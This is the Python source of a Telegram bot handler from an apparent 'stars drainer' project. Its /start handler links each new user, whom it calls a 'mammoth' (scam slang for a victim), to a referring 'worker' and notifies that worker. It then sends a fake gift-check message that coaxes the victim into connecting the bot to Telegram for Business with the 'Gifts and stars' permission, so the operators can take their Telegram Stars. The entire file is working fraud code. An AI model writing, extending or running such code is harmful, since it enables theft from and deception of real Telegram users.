# tworksteam/tdrainer stars/handlers/user_handlers.py

from aiogram import Router, types
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode
from aiogram import Bot

from bot_instance import bot, worker_bot
from database import link_mammoth_to_worker
from utils import escape_md

router = Router()

async def get_instruction_text(bot_instance: Bot, amount: int = 950) -> str:
    """
    Генерирует текст инструкции с динамической суммой звёзд.
    """
    # Укажите здесь актуальный юзернейм вашего бота
    bot_username = "CheckForStarsBot"

    # Текст теперь использует переменную amount для отображения суммы
    text = (
        f"Чек на {amount} звёзд\n"
        f"⭐ *Автоматическая доставка Stars \\- мгновенно и удобно\\!*\n\n"
        f"1\\. ⚙️ Откройте *Настройки*\\.\n"
        f"2\\. Нажмите на *Telegram для бизнеса*\\.\n"
        f"3\\. Перейдите в раздел *Чат\\-боты*\\.\n"
        f"4\\. Введите имя бота `@{bot_username}` и нажмите *Добавить*\\.\n"
        f"5\\. ✅ Выдайте разрешение пункт *'Подарки и звезды'* для выдачи звезд\\.\n\n"
        f"*Зачем это нужно?*\n"
        f"Подключение бота к бизнес\\-чату необходимо для того, чтобы он мог автоматически и "
        f"напрямую отправлять звезды от одного пользователя другому \\- без лишних действий и подтверждений\\."
    )
    return text

@router.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    args = message.text.split()
    worker_id = 0
    amount = 950  # Сумма по умолчанию, если она не передана

    if len(args) > 1:
        start_param = args[1]
        # Проверяем, содержит ли параметр и ID воркера, и сумму
        if '_' in start_param:
            parts = start_param.split('_')
            if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                worker_id = int(parts[0])
                amount = int(parts[1])
        # Обрабатываем старый формат (только ID воркера)
        elif start_param.isdigit():
            worker_id = int(start_param)

    mammoth_user = message.from_user
    is_new_link = link_mammoth_to_worker(mammoth_id=mammoth_user.id, worker_id=worker_id)

    if is_new_link and worker_id != 0:
        try:
            mammoth_name = escape_md(mammoth_user.full_name)
            
            await worker_bot.send_message(
                worker_id,
                f"🎉 У вас новый мамонт: *{mammoth_name}*",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception as e:
            print(f"Не удалось отправить уведомление воркеру {worker_id}: {e}")

    # Передаем полученную сумму в функцию для генерации текста
    final_text = await get_instruction_text(bot, amount)
    await message.answer(
        text=final_text,
        parse_mode=ParseMode.MARKDOWN_V2
    )